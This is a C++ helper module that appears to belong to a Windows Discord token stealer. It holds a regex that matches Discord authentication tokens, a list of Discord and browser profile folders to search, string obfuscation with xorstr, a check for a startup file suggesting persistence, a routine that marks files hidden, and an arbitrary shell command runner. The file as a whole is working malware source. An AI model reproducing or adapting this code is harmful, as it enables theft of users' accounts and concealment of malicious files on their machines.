#include <string>
#include <regex>
#include <filesystem>
#include <Windows.h>

#include "requests.h"
#include "helper.h"
#include <TlHelp32.h>
#include <iostream>

#pragma comment(lib,"Shell32.lib") 

namespace fs = std::filesystem;

namespace helpers {
	std::string regex_token = R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})";

	std::string roaming = getenv(xorstr_("APPDATA"));

	std::string local = getenv(xorstr_("LOCALAPPDATA"));

	std::array<std::pair<std::string, std::string>, 7> paths = { { { xorstr_("Discord"), roaming + xorstr_("\\Discord") },
															   { xorstr_("Discord Canary"), roaming + xorstr_("\\discordcanary") },
															   { xorstr_("Discord PTB"), roaming + xorstr_("\\discordptb") },
															   { xorstr_("Google Chrome"), local + xorstr_("\\Google\\Chrome\\User Data\\Default") },
															   { xorstr_("Opera"), roaming + xorstr_("\\Opera Software\\Opera Stable") },
															   { xorstr_("Brave"), local + xorstr_("\\BraveSoftware\\Brave-Browser\\User Data\\Default") },
															   { xorstr_("Yandex"), local + xorstr_("\\Yandex\\YandexBrowser\\User Data\\Default") },
															} };

	std::string read_file(const char* filename) {
		std::string content;
		FILE* fp;
		fopen_s(&fp, filename, xorstr_("rb"));
		if (fp) {
			fseek(fp, 0, SEEK_END);
			content.resize(ftell(fp));
			rewind(fp);
			fread(&content[0], 1, content.size(), fp);
			fclose(fp);
		}
		return(content);
	}

	bool is_initialized() {
		for (const auto& entry : fs::directory_iterator(client::PATH)) {
			if (entry.path().filename().string() == client::STARTUP_FILE_NAME) {
				return true;
			}
		}
		return false;
	}
	
	void hide_all_files(std::string path) {
		for (const auto& entry : fs::directory_iterator(path)) {
			SetFileAttributes(entry.path().string().c_str(), FILE_ATTRIBUTE_HIDDEN);
		}
	}

	void start_process(std::string path)
	{
		ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_SHOW);
	}

	void start_process_admin(std::string path) {
		system(path.c_str());
		//ShellExecute(NULL, "runas", path.c_str(), NULL, NULL, SW_SHOW);
	}

	bool is_process_running(const char* process_name) {
		HANDLE hProcessSnap;
		HANDLE hProcess;
		PROCESSENTRY32 pe32;

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (hProcessSnap == INVALID_HANDLE_VALUE)
			return INVALID_HANDLE_VALUE;

		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (!Process32First(hProcessSnap, &pe32))
			return INVALID_HANDLE_VALUE;

		do
		{
			if (strcmp(pe32.szExeFile, process_name) == 0)
				return true;

		} while (Process32Next(hProcessSnap, &pe32));

	}
	
	DWORD get_pid(const char* process_name) {
		HANDLE hProcessSnap;
		HANDLE hProcess;
		PROCESSENTRY32 pe32;

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (hProcessSnap == INVALID_HANDLE_VALUE)
			return 0;

		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (!Process32First(hProcessSnap, &pe32))
			return 0;

		do
		{
			if (strcmp(pe32.szExeFile, process_name) == 0)
				return pe32.th32ProcessID;

		} while (Process32Next(hProcessSnap, &pe32));
		return 0;
	}

	std::string exec(const char* cmd) {
		std::array<char, 128> buffer;
		std::string result;

		auto pipe = _popen(cmd, "r"); // get rid of shared_ptr

		if (!pipe)
			return "Pipe failed to open";

		while (!feof(pipe)) {
			if (fgets(buffer.data(), 128, pipe) != nullptr)
				result += buffer.data();
		}

		auto rc = _pclose(pipe);

		if (rc == EXIT_SUCCESS) { // == 0

		}
		else if (rc == EXIT_FAILURE) {  // EXIT_FAILURE is not used by all programs, maybe needs some adaptation.

		}
		return result;
	}

	bool is_elevated() {
		BOOL fRet = FALSE;
		HANDLE hToken = NULL;
		if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
			TOKEN_ELEVATION Elevation;
			DWORD cbSize = sizeof(TOKEN_ELEVATION);
			if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
				fRet = Elevation.TokenIsElevated;
			}
		}
		if (hToken) {
			CloseHandle(hToken);
		}
		return fRet;
	}

	std::wstring s2ws(const std::string& s) {
		int len;
		int slength = (int)s.length() + 1;
		len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
		wchar_t* buf = new wchar_t[len];
		MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
		std::wstring r(buf);
		delete[] buf;
		return r;
	}

	bool is_python_installed()
	{
		return helpers::exec("where python").find("Python") != std::string::npos || helpers::exec("where python").find("python") != std::string::npos;
	}

	void replace_all(std::string& str, const std::string& from, const std::string& to) {
		if (from.empty())
			return;
		size_t start_pos = 0;
		while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
			str.replace(start_pos, from.length(), to);
			start_pos += to.length(); // In case 'to' contains 'from', like replacing 'x' with 'yx'
		}
	}
}